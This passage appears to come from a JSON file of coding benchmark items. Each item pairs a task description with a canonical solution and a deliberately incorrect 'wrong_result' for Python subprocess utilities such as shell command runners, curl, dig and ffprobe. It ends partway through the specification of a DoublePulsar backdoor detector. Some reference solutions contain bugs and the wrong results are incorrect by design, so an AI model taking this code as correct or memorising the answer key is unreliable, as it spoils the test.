domain)\n        main_domain = re.sub(r'^[0-9]+\\.', '', main_domain)\n        subdomain = domain.replace(main_domain, \"\")\n        if not subdomain:\n            subdomain = self.DEFAULT\n        domain_id = self.get_domain_id(main_domain)\n        return domain_id, subdomain\n\n    def get_domain_id(self, domain):\n        if domain in self.domain_list:\n            return self.domain_list[domain]\n        domain_id = self.request(\"queryDomainInfo\", {\"domain\": domain})[\"domain\"][\"id\"]\n        self.domain_list[domain] = domain_id\n        return domain_id\n\n    def get_records(self, did, **conditions):\n        params = {\"did\": did}\n        params.update(conditions)\n        result = self.request(\"listRecord\", params=params)\n        records = {}\n        for record in result[\"records\"]:\n            key = (record[\"type\"], record[\"name\"], record[\"line\"])\n            records[key] = record\n        self.records[did] = records\n        return records\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        did = self.get_domain_id(domain)\n        name = domain\n        line = self.DEFAULT\n        record_key = (record_type, name, line)\n        if record_key in self.records[did]:\n            record = self.records[did][record_key]\n            self.request(\"updateRecord\", {\"id\": record[\"id\"], \"type\": record_type, \"name\": name, \"value\": value, \"ttl\": self.ttl})\n        else:\n            self.request(\"addRecord\", {\"did\": did, \"type\": record_type, \"name\": name, \"value\": value, \"ttl\": self.ttl})\n        return self.get_records(did, type=record_type, name=name, line=line)"
  },
  {
    "Task_id": 301,
    "Instruction": "Task Description: Implement a class to monitor and collect statistics about Passenger application server processes, including memory usage, CPU usage, and queue statistics.\n\nClass Description: The PassengerProcessCommunicator class is designed to interact with Passenger application server processes to gather various performance metrics. It uses subprocess communication to execute system commands and parse their outputs.\n\nAttributes:\n- config: [dict] - A configuration dictionary containing settings like command paths and sudo usage flags.\n\nMethods:\n- get_passenger_memory_stats() -> [dict] - Collects memory statistics for Apache, Nginx, and Passenger processes. Returns a dictionary with process lists and total memory usage.\n- get_passenger_cpu_usage(dict_stats: dict) -> [float] - Calculates total CPU usage percentage for all Passenger-related processes. Takes a dictionary of process stats and returns the total CPU usage.\n- get_passenger_queue_stats() -> [dict] - Gathers queue statistics from Passenger status, including top-level and application queue sizes. Returns a dictionary with queue metrics.",
    "Canonical_solution": "import subprocess\nimport re\nimport os\nfrom diamond.collector import str_to_bool\n\nclass PassengerProcessCommunicator:\n    def __init__(self, config):\n        self.config = config\n\n    def get_passenger_memory_stats(self):\n        command = [self.config[\"passenger_memory_stats_bin\"]]\n        if str_to_bool(self.config[\"use_sudo\"]):\n            command.insert(0, self.config[\"sudo_cmd\"])\n\n        try:\n            proc1 = subprocess.Popen(command, stdout=subprocess.PIPE)\n            (std_out, std_err) = proc1.communicate()\n        except OSError:\n            return {}\n\n        if std_out is None:\n            return {}\n\n        dict_stats = {\n            \"apache_procs\": [],\n            \"nginx_procs\": [],\n            \"passenger_procs\": [],\n            \"apache_mem_total\": 0.0,\n            \"nginx_mem_total\": 0.0,\n            \"passenger_mem_total\": 0.0,\n        }\n        \n        re_colour = re.compile(\"\\x1B\\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]\")\n        re_digit = re.compile(\"^\\d\")\n        \n        apache_flag = 0\n        nginx_flag = 0\n        passenger_flag = 0\n        for raw_line in std_out.splitlines():\n            line = re_colour.sub(\"\", raw_line)\n            if \"Apache processes\" in line:\n                apache_flag = 1\n            elif \"Nginx processes\" in line:\n                nginx_flag = 1\n            elif \"Passenger processes\" in line:\n                passenger_flag = 1\n            elif re_digit.match(line):\n                line_splitted = line.split()\n                if apache_flag == 1:\n                    dict_stats[\"apache_procs\"].append(line_splitted[0])\n                    dict_stats[\"apache_mem_total\"] += float(line_splitted[4])\n                elif nginx_flag == 1:\n                    dict_stats[\"nginx_procs\"].append(line_splitted[0])\n                    dict_stats[\"nginx_mem_total\"] += float(line_splitted[4])\n                elif passenger_flag == 1:\n                    dict_stats[\"passenger_procs\"].append(line_splitted[0])\n                    dict_stats[\"passenger_mem_total\"] += float(line_splitted[3])\n            elif \"Processes:\" in line:\n                passenger_flag = 0\n                apache_flag = 0\n                nginx_flag = 0\n\n        return dict_stats\n\n    def get_passenger_cpu_usage(self, dict_stats):\n        try:\n            proc1 = subprocess.Popen(\n                [\"top\", \"-b\", \"-n\", \"2\"],\n                stdout=subprocess.PIPE)\n            (std_out, std_err) = proc1.communicate()\n        except OSError:\n            return -1\n\n        re_lspaces = re.compile(\"^\\s*\")\n        re_digit = re.compile(\"^\\d\")\n        overall_cpu = 0\n        for raw_line in std_out.splitlines():\n            line = re_lspaces.sub(\"\", raw_line)\n            if not re_digit.match(line):\n                continue\n\n            line_splitted = line.split()\n            if line_splitted[0] in dict_stats[\"apache_procs\"]:\n                overall_cpu += float(line_splitted[8])\n            elif line_splitted[0] in dict_stats[\"nginx_procs\"]:\n                overall_cpu += float(line_splitted[8])\n            elif line_splitted[0] in dict_stats[\"passenger_procs\"]:\n                overall_cpu += float(line_splitted[8])\n\n        return overall_cpu\n\n    def get_passenger_queue_stats(self):\n        queue_stats = {\n            \"top_level_queue_size\": 0.0,\n            \"passenger_queue_size\": 0.0,\n        }\n\n        command = [self.config[\"passenger_status_bin\"]]\n        if str_to_bool(self.config[\"use_sudo\"]):\n            command.insert(0, self.config[\"sudo_cmd\"])\n\n        try:\n            proc1 = subprocess.Popen(command, stdout=subprocess.PIPE)\n            (std_out, std_err) = proc1.communicate()\n        except OSError:\n            return {}\n\n        if std_out is None:\n            return {}\n\n        re_colour = re.compile(\"\\x1B\\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]\")\n        re_requests = re.compile(r\"Requests\")\n        re_topqueue = re.compile(r\"^top-level\")\n\n        gen_info_flag = 0\n        app_groups_flag = 0\n        for raw_line in std_out.splitlines():\n            line = re_colour.sub(\"\", raw_line)\n            if \"General information\" in line:\n                gen_info_flag = 1\n            if \"Application groups\" in line:\n                app_groups_flag = 1\n            elif re_requests.match(line) and re_topqueue.search(line):\n                line_splitted = line.split()\n                if gen_info_flag == 1 and line_splitted:\n                    queue_stats[\"top_level_queue_size\"] = float(line_splitted[5])\n            elif re_requests.search(line) and not re_topqueue.search(line):\n                line_splitted = line.split()\n                if app_groups_flag == 1 and line_splitted:\n                    queue_stats[\"passenger_queue_size\"] = float(line_splitted[3])\n\n        return queue_stats",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\nimport re\nimport psutil\n\nclass PassengerProcessCommunicator:\n    def __init__(self, config):\n        self.config = config\n\n    def get_passenger_memory_stats(self):\n        memory_stats = {\n            'processes': [],\n            'total_memory_usage': 0\n        }\n        commands = [\n            'ps -eo pid,comm,vsz, rss --sort -rss | grep -vE \"PID|COMMAND|USER|TIME|CMD\"',\n            'ps -eo pid,comm,vsz, rss --sort -rss | grep -vE \"PID|COMMAND|USER|TIME|CMD\"'\n        ]\n        for cmd in commands:\n            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)\n            if result.returncode != 0:\n                continue\n            lines = result.stdout.strip().split('\\n')\n            for line in lines:\n                if not line:\n                    continue\n                parts = line.split()\n                if len(parts) < 4:\n                    continue\n                pid = parts[0]\n                comm = parts[1]\n                vsz = int(parts[2])\n                rss = int(parts[3])\n                memory_stats['processes'].append({\n                    'pid': pid,\n                    'comm': comm,\n                    'vsz': vsz,\n                    'rss': rss\n                })\n                memory_stats['total_memory_usage'] += rss\n        return memory_stats\n\n    def get_passenger_cpu_usage(self, dict_stats):\n        total_cpu_usage = 0.0\n        processes = dict_stats.get('processes', [])\n        for process in processes:\n            try:\n                cpu_percent = psutil.Process(int(process['pid'])).cpu_percent(interval=0.1)\n                total_cpu_usage += cpu_percent\n            except psutil.NoSuchProcess:\n                pass\n        return total_cpu_usage\n\n    def get_passenger_queue_stats(self):\n        queue_stats = {\n            'top_level_queues': [],\n            'application_queues': []\n        }\n        result = subprocess.run('passenger-status | grep -A 50 \"Queues\"', shell=True, capture_output=True, text=True)\n        if result.returncode != 0:\n            return queue_stats\n        lines = result.stdout.strip().split('\\n')\n        for line in lines:\n            if not line:\n                continue\n            if 'Top-level queues' in line:\n                continue\n            if 'Application queues' in line:\n                continue\n            if 'Queue' in line:\n                continue\n            if 'Total' in line:\n                continue\n            parts = line.split()\n            if len(parts) < 2:\n                continue\n            queue_name = parts[0]\n            queue_size = int(parts[1])\n            if 'top_level' in line.lower():\n                queue_stats['top_level_queues'].append(queue_name)\n            else:\n                queue_stats['application_queues'].append(queue_name)\n        return queue_stats"
  },
  {
    "Task_id": 302,
    "Instruction": "Task Description: Create a function that uses subprocess.Popen with pipes to execute a curl command, handle its output, and store the results in a database.\n\nFunction Description: The function executes a curl command as a subprocess to fetch HTTP headers from a URL using a SOCKS proxy. It handles timeouts, processes the output to extract HTTP status codes, and records all results (including errors) in a global database. The function includes a small delay between calls to avoid overwhelming the system.\n\nInput:\n- self: The object instance containing URL and attempt count (implicit in method context)\n- url: [str] - The target URL to fetch (accessed via self.url)\n- USER_AGENT: [str] - The user agent string for the HTTP request\n- SOCKS_PROXY: [str] - The SOCKS proxy address to use\n- CURL_TIMEOUT: [int] - Maximum time allowed for the curl command to complete\n\nOutput:\n- None (direct return value), but the function:\n  - Updates self.last_code with the HTTP status code\n  - Increments self.attempt counter\n  - Inserts a record into GLOBAL_DB containing:\n    - url: [str] - The requested URL\n    - attempt: [int] - The attempt number\n    - out: [bytes/str] - The curl command's stdout output\n    - err: [bytes/str] - The curl command's stderr output or error message\n    - http_code: [int] - The extracted HTTP status code\n    - curl_exit: [int] - The curl process's exit code",
    "Canonical_solution": "import subprocess\nimport time\n\ndef fetch1(self):\n    args = [ 'curl', '--head', '--user-agent', USER_AGENT, '--proxy', SOCKS_PROXY, self.url ]\n    time.sleep(1) # slight breathing space because MP\n    try:\n        p = subprocess.Popen(args, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.PIPE) # todo: text=True\n        (out, err) = p.communicate(timeout=CURL_TIMEOUT)\n        hcode = extract_hcode(str(out)) # str() not needed if text=True\n        if hcode == 200: err = PLACEHOLDER\n        ecode = p.returncode\n    except subprocess.TimeoutExpired as e:\n        (out, err) = (PLACEHOLDER, str(e))\n        hcode = BADNESS + 10\n        ecode = BADNESS + 10\n    self.last_code = hcode\n    self.attempt += 1\n    GLOBAL_DB.insert(dict(\n        url=self.url,\n        attempt=self.attempt,\n        out=out,\n        err=err,\n        http_code=hcode,\n        curl_exit=ecode,\n    ))",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\nimport time\nimport socket\n\ndef execute_curl(self, url, USER_AGENT, SOCKS_PROXY, CURL_TIMEOUT):\n    self.attempt += 1\n    command = [\n        'curl',\n        '-v',\n        '-H', f'User-Agent: {USER_AGENT}',\n        '-x', SOCKS_PROXY,\n        '-m', str(CURL_TIMEOUT),\n        url\n    ]\n    \n    try:\n        process = subprocess.Popen(\n            command,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            text=True\n        )\n        stdout, stderr = process.communicate(timeout=CURL_TIMEOUT)\n        exit_code = process.returncode\n        \n        if exit_code == 0:\n            # Extract HTTP status code from stdout\n            status_line = stdout.split('\\r\\n')[0]\n            http_code = int(status_line.split()[1])\n            self.last_code = http_code\n        else:\n            http_code = -1\n            self.last_code = -1\n        \n        GLOBAL_DB.insert({\n            'url': url,\n            'attempt': self.attempt,\n            'out': stdout,\n            'err': stderr,\n            'http_code': http_code,\n            'curl_exit': exit_code\n        })\n    \n    except subprocess.TimeoutExpired:\n        stderr = f\"Timeout after {CURL_TIMEOUT} seconds\"\n        exit_code = 1\n        http_code = -1\n        self.last_code = -1\n        GLOBAL_DB.insert({\n            'url': url,\n            'attempt': self.attempt,\n            'out': '',\n            'err': stderr,\n            'http_code': http_code,\n            'curl_exit': exit_code\n        })\n    \n    except Exception as e:\n        stderr = str(e)\n        exit_code = 1\n        http_code = -1\n        self.last_code = -1\n        GLOBAL_DB.insert({\n            'url': url,\n            'attempt': self.attempt,\n            'out': '',\n            'err': stderr,\n            'http_code': http_code,\n            'curl_exit': exit_code\n        })\n    \n    time.sleep(1)"
  },
  {
    "Task_id": 304,
    "Instruction": "Task Description: Create a function that executes a system command using Python's subprocess module and returns the output.\n\nFunction Description: The function should take a system command as input, execute it in a subprocess, capture the standard output, and return it as a string. The function should handle the process creation, communication, and cleanup automatically.\n\nInput: \n- com: str - A string representing the system command to be executed\n\nOutput:\n- str - The decoded standard output from the executed command",
    "Canonical_solution": "import urllib.request\nimport subprocess\n\ndef excuteCommand(com):\n    ex = subprocess.Popen(com, stdout=subprocess.PIPE, shell=True)\n    out, err = ex.communicate()\n    statusofssh = ex.wait()\n    return out.decode()",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\ndef execute_command(com):\n    result = subprocess.run(com, capture_output=True, text=True)\n    return result.stdout"
  },
  {
    "Task_id": 305,
    "Instruction": "Task Description: The task involves creating Python functions for executing system commands and processing their output through inter-process communication (IPC) using pipes. The functions should handle command execution, output decoding, and temporary file management for command processing.\n\nFunction Description: The provided functions enable executing system commands through subprocesses, capturing and decoding their output, and processing text data through temporary files when needed. The functions handle Windows-specific configurations and character encoding.\n\nInput:\n- For run_and_read(view, cmd):\n  - view: [Any] - A placeholder parameter (unused in function)\n  - cmd: [str] - The command string to execute via cmd.exe\n\n- For filter_region(view, txt, command):\n  - view: [Any] - A placeholder parameter (unused in function)\n  - txt: [str] - The text content to process\n  - command: [str] - The command to process the text with\n\n- For get_startup_info() and get_oem_cp(): No input parameters\n\nOutput:\n- For run_and_read(): [str] - The decoded output from the command execution\n- For filter_region(): [str] - The processed text output from the command\n- For get_startup_info(): [subprocess.STARTUPINFO] - Windows process startup configuration\n- For get_oem_cp(): [str] - The OEM code page identifier as a string",
    "Canonical_solution": "import subprocess\nfrom subprocess import PIPE\nimport os\nimport tempfile\nimport ctypes\n\ndef get_startup_info():\n    startupinfo = subprocess.STARTUPINFO()\n    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW\n    return startupinfo\n\ndef run_and_read(view, cmd):\n    out, err = subprocess.Popen(['cmd.exe', '/c', cmd],\n                                stdout=PIPE,\n                                stderr=PIPE,\n                                shell=True,\n                                startupinfo=get_startup_info()).communicate()\n    try:\n        return (out or err).decode(get_oem_cp()).replace('\\r\\n', '\\n')\n    except AttributeError:\n        return ''\n\ndef filter_region(view, txt, command):\n    try:\n        contents = tempfile.NamedTemporaryFile(suffix='.txt', delete=False)\n        contents.write(txt.encode('utf-8'))\n        contents.close()\n\n        script = tempfile.NamedTemporaryFile(suffix='.bat', delete=False)\n        script.write(('@echo off\\ntype %s | %s' % (contents.name, command)).encode('utf-8'))\n        script.close()\n\n        p = subprocess.Popen([script.name],\n                             stdout=PIPE,\n                             stderr=PIPE,\n                             startupinfo=get_startup_info())\n\n        out, err = p.communicate()\n        return (out or err).decode(get_oem_cp()).replace('\\r\\n', '\\n')[:-1].strip()\n    finally:\n        os.remove(script.name)\n        os.remove(contents.name)\n\ndef get_oem_cp():\n    codepage = ctypes.windll.kernel32.GetOEMCP()\n    return str(codepage)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\nimport os\nimport sys\nimport codecs\n\ndef run_and_read(view, cmd):\n    startup_info = get_startup_info()\n    process = subprocess.Popen(\n        [cmd],\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        stdin=subprocess.PIPE,\n        startupinfo=startup_info,\n        creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == \"win32\" else 0\n    )\n    stdout, stderr = process.communicate()\n    output = stdout.decode('utf-8', errors='ignore') + stderr.decode('utf-8', errors='ignore')\n    return output\n\ndef filter_region(view, txt, command):\n    if not txt:\n        return \"\"\n    try:\n        result = subprocess.run(\n            [command],\n            input=txt,\n            capture_output=True,\n            text=True,\n            check=True\n        )\n        return result.stdout\n    except subprocess.CalledProcessError as e:\n        return e.stderr\n\ndef get_startup_info():\n    si = subprocess.STARTUPINFO()\n    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW\n    si.wShowWindow = subprocess.SW_HIDE\n    return si\n\ndef get_oem_cp():\n    return str(ctypes.windll.kernel32.GetOEMCP())"
  },
  {
    "Task_id": 308,
    "Instruction": "Task Description: Write a Python function that queries DNS information for a given domain using the `dig` command, with options for TCP protocol and IPv6.\n\nFunction Description: The function `query_domain` executes a DNS query using the `dig` command-line tool. It retrieves the CNAME and IP address for the specified domain, with configurable query type and DNS server. The function supports TCP protocol and IPv6 queries. It parses the output to extract the first valid CNAME and IP address.\n\nInput:\n- `domain`: [str] - The domain name to query\n- `tcp`: [bool] - Whether to use TCP protocol for the DNS query (default: False)\n- `config`: [dict] - Configuration dictionary containing:\n  - `querytype`: [str] - DNS query type (e.g., 'A', 'AAAA')\n  - `dns`: [str] - DNS server address to query\n\nOutput:\n- [tuple] - A tuple containing:\n  - First valid CNAME found (str), empty string if none\n  - First valid IP address found (str), empty string if none",
    "Canonical_solution": "import subprocess\nimport shlex\n\ndef query_domain(domain, tcp):\n    cmd = \"dig +short +time=2 -6 %s @'%s' '%s'\"\\\n        % (config['querytype'], config['dns'], domain)\n\n    if tcp:\n        cmd = cmd + ' +tcp'\n\n    proc = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE)\n    out, _ = proc.communicate()\n    outarr = out.decode('utf-8').splitlines()\n\n    cname = ip = ''\n    for v in outarr:\n        if cname == '' and validate_domain(v[:-1]):\n            cname = v[:-1]\n        if ip == '' and validate_ip_addr(v):\n            ip = v\n            break\n\n    return (cname, ip)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "def query_domain(domain, tcp=False, config=None):\n    import subprocess\n    import re\n    from socket import inet_ntop, AF_INET6\n\n    if config is None:\n        config = {}\n\n    querytype = config.get('querytype', 'A')\n    dns = config.get('dns', '8.8.8.8')\n\n    command = ['dig', '+short', f'{querytype}.{domain}']\n    if tcp:\n        command.append('+tcp')\n    if dns:\n        command.append(f'@{dns}')\n\n    result = subprocess.run(command, capture_output=True, text=True)\n    output = result.stdout.strip()\n\n    cname = ''\n    ip = ''\n\n    # Extract CNAME\n    cname_match = re.search(r'CNAME\\s+([^ ]+)', output)\n    if cname_match:\n        cname = cname_match.group(1)\n\n    # Extract IP addresses\n    ip_addresses = []\n    if querytype == 'A':\n        ip_matches = re.findall(r'(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b)', output)\n        ip_addresses = [inet_ntop(AF_INET6, ip) if ':' in ip else ip for ip in ip_matches]\n    elif querytype == 'AAAA':\n        ip_matches = re.findall(r'(\\b[\\da-fA-F:]+\\b)', output)\n        ip_addresses = [inet_ntop(AF_INET6, ip) for ip in ip_matches]\n\n    if ip_addresses:\n        ip = ip_addresses[0]\n\n    return (cname, ip)"
  },
  {
    "Task_id": 309,
    "Instruction": "Task Description: Convert HTML content to plain text using external command-line tools through subprocess communication.\n\nFunction Description: The function converts HTML data to plain text using either 'lynx' or 'html2text' command-line tools. It handles process creation, input/output communication via pipes, and result processing. The function supports additional options for the conversion tools and ensures proper character encoding.\n\nInput:\n- data: [str] - The HTML content to be converted\n- baseurl: [str] - Base URL for relative links (unused in current implementation)\n- method: [str] - Conversion method ('lynx' or 'html2text')\n- options: [dict] - Additional options to pass to the conversion tool (key-value pairs where value can be None for flag options)\n\nOutput:\n- [str] - The converted plain text content with formatting cleaned up",
    "Canonical_solution": "import re\nimport os\nimport subprocess\nimport logging\n\nlogger = logging.getLogger(__name__)\n\ndef html2text(data, baseurl, method, options):\n    if method == 'lynx':\n        cmd = ['lynx', '-nonumbers', '-dump', '-stdin', '-assume_charset UTF-8', '-display_charset UTF-8']\n    elif method == 'html2text':\n        if '-utf8' in subprocess.check_output(['html2text', '-help'], encoding='utf-8'):\n            cmd = ['html2text', '-nobs', '-utf8']\n        else:\n            cmd = ['html2text', '-nobs']\n    else:\n        raise ValueError('Unknown html2text method: %r' % (method,))\n\n    stdout_encoding = 'utf-8'\n\n    for k, v in options.items():\n        if v is not None:\n            cmd.extend(['-{}'.format(k), '{}'.format(v)])\n        else:\n            cmd.append('-{}'.format(k))\n\n    logger.debug('Command: %r, stdout encoding: %s', cmd, stdout_encoding)\n\n    env = {}\n    env.update(os.environ)\n    env['LANG'] = 'en_US.utf-8'\n    env['LC_ALL'] = 'en_US.utf-8'\n\n    html2text = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, env=env)\n    stdout, stderr = html2text.communicate(data.encode('utf-8'))\n    stdout = stdout.decode(stdout_encoding)\n\n    if method == 'lynx':\n        stdout = re.sub(r'file://%s/[^/]*/' % (os.environ.get('TMPDIR', '/tmp'),), '', stdout)\n        stdout = re.sub(r'file://localhost%s/[^/]*/' % (os.environ.get('TMPDIR', '/tmp'),), '', stdout)\n        stdout = re.sub(r'L\\d+-\\d+TMP.html', '', stdout)\n\n    return stdout.strip()",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\nimport shlex\n\ndef html_to_plain_text(data, baseurl, method, options):\n    if method == 'lynx':\n        cmd = ['lynx', '-dump']\n    elif method == 'html2text':\n        cmd = ['html2text']\n    else:\n        raise ValueError(\"Invalid method. Use 'lynx' or 'html2text'.\")\n    \n    # Add options to the command\n    for key, value in options.items():\n        if value is not None:\n            cmd.append(f\"--{key}={value}\")\n        else:\n            cmd.append(f\"--{key}\")\n    \n    # Create a pipe to the command\n    process = subprocess.Popen(\n        cmd,\n        stdin=subprocess.PIPE,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        text=True\n    )\n    \n    # Send the HTML data to the command\n    stdout, stderr = process.communicate(input=data)\n    \n    if process.returncode != 0:\n        raise RuntimeError(f\"Error converting HTML to plain text: {stderr}\")\n    \n    return stdout.rstrip('\\n')"
  },
  {
    "Task_id": 310,
    "Instruction": "Task Description: Create a function that uses subprocess.Popen with pipes to execute ffprobe (a multimedia stream analyzer) on a specified file and return the output in JSON format.\n\nFunction Description: The function _probe executes ffprobe command-line tool to analyze a multimedia file, capturing its format and stream information. It uses subprocess.Popen with pipes to handle inter-process communication, converts the output to JSON, and handles errors if the process fails.\n\nInput:\n- filename: [str] - Path to the multimedia file to analyze\n- cmd: [str] (optional, default=\"ffprobe\") - Name/path of the ffprobe executable\n- timeout: [int/float] (optional) - Timeout in seconds for the subprocess\n- **kwargs: [dict] (optional) - Additional ffprobe command-line arguments\n\nOutput:\n- [dict] - Parsed JSON output containing multimedia file information\n- Raises ffmpeg.Error if the process returns a non-zero exit code (includes stderr in exception)",
    "Canonical_solution": "import json\nimport subprocess\nimport ffmpeg\n\ndef _probe(filename, cmd=\"ffprobe\", timeout=None, **kwargs):\n    \"\"\"Run ffprobe on the specified file and return a JSON representation of the output.\n\n    Raises:\n        :class:`ffmpeg.Error`: if ffprobe returns a non-zero exit code,\n            an :class:`Error` is returned with a generic error message.\n            The stderr output can be retrieved by accessing the\n            ``stderr`` property of the exception.\n    \"\"\"\n    args = [cmd, \"-show_format\", \"-show_streams\", \"-of\", \"json\"]\n    args += ffmpeg._utils.convert_kwargs_to_cmd_line_args(kwargs)\n    args += [filename]\n\n    p = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    communicate_kwargs = {}\n    if timeout is not None:\n        communicate_kwargs[\"timeout\"] = timeout\n    out, err = p.communicate(**communicate_kwargs)\n    if p.returncode != 0:\n        raise ffmpeg.Error(\"ffprobe\", out, err)\n    return json.loads(out.decode(\"utf-8\"))",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\nimport json\nfrom ffmpeg import Error\n\ndef _probe(filename, cmd=\"ffprobe\", timeout=None, **kwargs):\n    command = [cmd, \"-v\", \"quiet\", \"-print_format\", \"json\", \"-show_format\", \"-show_streams\", filename]\n    command += [f\"{k}={v}\" for k, v in kwargs.items()]\n    \n    process = subprocess.Popen(\n        command,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        text=True\n    )\n    \n    stdout, stderr = process.communicate()\n    \n    if process.returncode != 0:\n        raise Error(stderr)\n    \n    return json.loads(stdout)"
  },
  {
    "Task_id": 311,
    "Instruction": "Task Description: Implement a set of utility functions for executing shell commands in Python using subprocess.PIPE for inter-process communication, with options for real-time output display and logging.\n\nFunction Description: The functions provide different ways to execute shell commands and handle their output:\n1. run_command - Executes a command and collects all output lines\n2. run_shell_display - Executes a command and displays output in real-time\n3. run_shell - Executes a command and logs output to a file\n\nInput:\n- For run_command: cmd [str] - The shell command to execute\n- For run_shell_display: cmd [str] - The shell command to execute\n- For run_shell: cmd [str] - The shell command to execute, log_file [str] - Path to log file\n\nOutput:\n- For run_command: [str] - Combined stdout/stderr output\n- For run_shell_display: None (output is displayed in real-time)\n- For run_shell: [bytes] - Raw command output (also written to log file)",
    "Canonical_solution": "import subprocess\n\ndef run_command(cmd):\n    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n    stdout = []\n    while True:\n        line = p.stdout.readline()\n        stdout.append(line)\n        print(line.decode(\"utf-8\"))\n        if line == \"\" and p.poll() != None:\n            break\n    return \"\".join(stdout)\n\ndef run_shell_display(cmd):\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n    while True:\n        out = p.stdout.read(1).decode(\"utf-8\")\n        if out == \"\" and p.poll() != None:\n            break\n        if out != \"\":\n            sys.stdout.write(out)\n            sys.stdout.flush()\n    return\n\ndef run_shell(cmd, log_file):\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n    (output, err) = p.communicate()\n    p.wait()\n    with open(log_file, \"a+\") as logfile:\n        logfile.write(output.decode(\"utf-8\") + \"\\n\")\n        logfile.write(err.decode(\"utf-8\") + \"\\n\")\n    return output",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\nimport time\n\ndef run_command(cmd):\n    process = subprocess.Popen(\n        cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = process.communicate()\n    return stdout.decode('utf-8') + stderr.decode('utf-8')\n\ndef run_shell_display(cmd):\n    process = subprocess.Popen(\n        cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    while True:\n        output = process.stdout.readline()\n        if output == b'':\n            break\n        if output:\n            print(output.decode('utf-8'), end='')\n    rc = process.poll()\n    if rc != 0:\n        print(stderr.decode('utf-8'))\n\ndef run_shell(cmd, log_file):\n    with open(log_file, 'wb') as f:\n        process = subprocess.Popen(\n            cmd, shell=True, stdout=f, stderr=f)\n        process.wait()\n    with open(log_file, 'rb') as f:\n        return f.read()"
  },
  {
    "Task_id": 313,
    "Instruction": "Task Description: Create a function that executes a system command in a specified working directory and handles the command's output and errors.\n\nFunction Description: The function `run_command` executes a given system command in a specified working directory using Python's `subprocess` module. It captures the command's standard output and error streams, decodes them, and prints them. If the command returns a non-zero exit code, it raises a `CalledProcessError`.\n\nInput:  \n- `command`: [str] - The system command to be executed.  \n- `working_dir`: [str] - The working directory where the command will be executed.  \n\nOutput:  \n- None (prints output/error messages directly). Raises `subprocess.CalledProcessError` if the command fails (non-zero exit code).",
    "Canonical_solution": "import os\nimport subprocess\nimport sys\n\ndef run_command(command, working_dir):\n    command_array = command.split(\" \")\n    process = subprocess.Popen(command_array, cwd=working_dir, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = process.communicate()\n    if stdout:\n        print(stdout.decode('utf-8'))\n    if stderr:\n        print(stderr.decode('utf-8'), level=\"error\")\n    if process.returncode != 0:\n        raise subprocess.CalledProcessError(process.returncode, command)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "def run_command(command, working_dir):\n    import subprocess\n    process = subprocess.run(\n        command,\n        cwd=working_dir,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        text=True\n    )\n    print(\"Output:\", process.stdout)\n    print(\"Error:\", process.stderr)\n    if process.returncode != 0:\n        raise subprocess.CalledProcessError(process.returncode, command)"
  },
  {
    "Task_id": 319,
    "Instruction": "Task Description: Implement a class to detect the presence of DoublePulsar implants in SMB and RDP services on a target IP address using TCP socket communication.\n\nClass Description: The DoublePulsar class provides functionality to check for the presence of DoublePulsar backdoor implants in SMB (port 445) and RDP (port 3389) services. It handles protocol-specific packet crafting, socket communication, and response analysis.\n\nAttributes:\n- ip: str - Target IP address to scan (default: \"127.0.0.1\")\n- timeout: float - Socket timeout in seconds (default: None)\n- verbose: bool - Flag for verbose output (default: False)\n- ssl_negotiation_request: bytes - Predefined RDP SSL negotiation packet\n- non_ssl_negotiation_request: bytes - Predefined RDP non-SSL negotiation packet\n- non_ssl_client_data: bytes - Predefined RDP non-SSL client data packet\n- ssl_client_data: bytes - Predefined RDP SSL client data packet\n- ping_packet: bytes - Predefined RDP ping packet\n- negotiate_protocol_request: bytes - Predefined SMB negotiation packet\n- session_setup_request: bytes - Predefined SMB session setup packet\n- tree_connect_request: bytes - Predefined SMB tree connect packet\n- trans2_session_setup: bytes - Predefined SMB trans2 session setup packet\n\nMethods:\n- check_ip_smb() -> tuple[bool, str] - Checks for DoublePulsar implant via SMB protocol\n  Returns tuple containing detection status and message\n- check_ip_rdp() -> tuple[bool, str] - Checks for DoublePulsar implant via RDP protocol\n  Returns tuple containing detection status and message\n- _calculate_doublepulsar_xor_key(s: int) -> int - Internal method to calculate XOR key from signature\n  Takes signature value as input, returns calculated key",
